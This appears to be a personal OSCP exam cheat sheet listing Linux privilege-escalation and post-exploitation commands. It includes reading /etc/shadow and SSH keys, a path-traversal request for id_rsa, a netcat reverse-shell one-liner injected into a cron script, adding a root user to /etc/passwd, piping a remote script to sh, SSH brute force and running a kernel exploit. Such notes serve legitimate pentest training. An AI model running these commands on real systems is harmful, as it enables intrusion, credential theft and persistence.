Tags: [[OSCP]]

---
# Initial Access
Launch Netcat Listener: `nc -nvlp 1234`
Launch HTML server: `python3 -m http.server 80
Launch Python Virtual Environment:
- `cd ~/py` 
- `python3 -m venv venv
- `source bin/activate
Run enum4linux-ng: `enum4linux-ng -A 192.168.x.x`
Run enum4linux: `enum4linux 192.168.x.x` (Run both tools)
# PrivEsc
## Upgrade Shell
- `/usr/bin/script -qc /bin/bash /dev/null
- `python3 -c 'import pty; pty.spawn("/bin/bash")'
- `python3 -c "import pty; pty.spawn('/bin/sh')"
- `/bin/sh -i` | `/bin/bash -i` | `echo 'os.system('/bin/bash')'`
- `perl -e 'exec "/bin/sh";'`
- To escape rbash
	- `ssh user@ip -t "bash --noprofile"`
	- `export PATH=$PATH:/usr/local/sbin:/usr/localsbin:/usr/sbin:/usr/bin:/sbin:/bin`
## Enumerate
- `find / -name local.txt -type f 2>/dev/null`
- `id`
- `cat /etc/passwd` | `cat /etc/shadow` | `cat /root/.ssh`
- `hostname`, `cat /etc/issue`,`cat /etc/os-release`, `uname -a`
- `/home/andrew/.bash_history`
- `sudo -l` --> check [GTFOBins](https://gtfobins.github.io/)
- `crontab -l`
- `su root:root`, `su andrew:andrew`, `su andrew:(NOPASS)`, `sudo -i` (reqs root password)
- `ls /var/mail` | `ls /var/spool/mail`
- `/usr/sbin/getcap -r / 2>/dev/null`
- [If member of Disk Group](https://vk9-sec.com/disk-group-privilege-escalation/?source=post_page-----9aaa071b5989--------------------------------)
	- `df -h` (find OS) | `debugfs /dva/OS` | `/etc/shadow` `/root/.ssh`
- Binaries
	- `find / -perm -4000 2>/dev/null`
	- `find / -perm -u=s -type f 2>/dev/null -printf "%f\n"`
		- `ls -lah` & check [GTFObins](https://gtfobins.github.io/#)
- Processes:
	- `ps -eaf`
	- Watch processes:`watch -n 1 "ps -aux | grep pass"`
	-  Pspy: https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32
		- `wget $kaliIP/pspy32`
		- `chmod +x pspy32` & `timeout 2m ./pspy32`
	- If root is regularly running a writable script: `echo "chmod +s /bin/bash" >> script.sh` then `/bin/bash -p`
- Enumeration Scripts:
	- [SUIDer](https://github.com/etc5had0w/suider/blob/main/suider.sh): `wget -L https://github.com/etc5had0w/suider/blob/main/suider.sh`
	- [LinPeas](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS): `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`
	- [LinEnum](https://github.com/rebootuser/LinEnum)
	- Kali Pre-installed `unix-privesc-check`
	- [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester) `https://github.com/The-Z-Labs/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh`
	- [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration) `wget https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh`

## Exploit
- RSA key on Linux server: `curl http://192.168.XX.XXX/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/username/.ssh/id_rsa`
# Random - To Sort
- `exiftool -a -u file.pdf` (metadata inspector) 
- 

- Linux -  https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
- https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ (Comprehensive Cheat Sheet)
- DirtyPipe https://medium.com/@urshilaravindran/dirty-pipe-linux-local-privilege-escalation-cve-2022-0847-f16ec3c04ea4
- PwnKit https://github.com/ly4k/PwnKit/tree/main (POWERFUL)
- Wildcards with tar https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa

## Manual Enumeration
System/User Info
- 
- List installed applications: `dpkg -l` (Debian) or `rpm` (RedHat)
- Find writable directories: `find / -writable -type d 2>/dev/null`
- Cron Jobs: `ls -lah /etc/cron*` & `sudo crontab -l`
- List drives mounted at boot: `cat /etc/fstab`
- View all available disks: `lsblk`
- List loaded kernel modules: `lsmod` (Inspect a Module: `/sbin/modinfo modulename`)
- Find permissions that can be set: `find / -perm -u=s -type f 2>/dev/null`
	- Check binaries with `strings` (eg. `strings /usr/bin/passwd_flag`)
- Net
	- Network interfaces: `ipconfig` or `ip a` 
	- Routing Tables: `routel` 
	- Network connections: `netstat` or `ss -anp` 
	- Firewall Rules: `cat /etc/iptables/rules.v4`
### Other Tools
- [LinEnum](https://github.com/rebootuser/LinEnum) ([Script](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh))
	- `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh && chmod +x LinEnum.sh` (`./LinEnum.sh` to run)
- [LinPeas](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) ([Releases](https://github.com/peass-ng/PEASS-ng/releases/tag/20240908-e068962e))
	- `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`
## Inspecting User Trails
- `env`
- `cat .bashrc`

Switch to root with credentials found: `su -root`
Use `crunch` to generate custom wordlist for password bruteforce another user: 
- `crunch 6 6 -t Lab%%% > wordlist`
- Then use wordlist with Hydra: `hydra -l user -P wordlist 192.168.taregt.ip -t 4 ssh -V`

## Inspecting Service Footprints
Look for "pass"
- Watch processes with 1 second refresh:`watch -n 1 "ps -aux | grep pass"`
- Capture traffic via tcmpdump: `sudo tcpdump -i lo -A | grep "pass"`

## Insecure File Permissions
### Abusing Cron Jobs
Inspect cron log file: `grep "CRON" /var/log/syslog`
- Look for scripts running regularly that you can modify
  Check permission: `ls -lah file/path/.scripts/target_script.sh `)
- Echo into the script a reverse-shell one-liner then wait for it to execute
  eg. `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.attack.ip 4444 >/tmp/f" >> /file/path/target_script.sh`
## Abusing Password Authentication
If `/ect/passwd` is writable (`ls -lah /etc/passwd`)
- Generate a password hash (crypt algorithm): `openssl passwd pass123`
- Echo new user "root2" into /etc/passwd: `echo "root2:PaSsW0rdHashH3r3:0:0:root:/root:/bin/bash" >> /etc/passwd`
- Switch to new root user: `su root2` & enter `pass123`
## Insecure System Components
Run password change for low-privilege user: `passwd`
- In another tab, check the process ID: `ps u -C passwd` 
- Check process (UID=1932) is running as root: `grep Uid /proc/1932/status`
	  `Uid: 1000    0    0    0` (Uid of "zero" means it's root)
- Check process for a Set-User-ID: `ls -asl /usr/bin/passwd`
	  `-rwsr-xr-x 1 root root` (look for `s`)

If we found `find` is misconfigured:
- `find /home/joe/Desktop -exec "/usr/bin/bash" -p \;`

To search for misconfigured capabilities: `/usr/sbin/getcap -r / 2>/dev/null`
	Look for options with `setuid+ep` (set UID is *effective* and *permitted*)

## Kernel Vulnerabilities
Always inspect the following;
- System information: `cat /etc/issue`
- Kernel Version: `uname -r`
- System architechture: `arch`

Use Searchsploit to look for kernel exploits: `searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"`
- Copy exploit to current folder: `cp /usr/share/exploitdb/exploits/linux/local/45010.c .`
- Check `head` for compilation instructions: `head 45010.c`
- If exploit has GCC;
	- Just needs a rename: `mv 45010.c cve-2017-16995.c`
	- Transfer exploit to target via SCP: `scp cve-2017-16995.c joe@192.168.target.ip.:`
	- Connect & run GCC to compile: `gcc cve-2017-16995.c -o cve-2017-16995`
	- Run exploit: `./cve-2017-16995`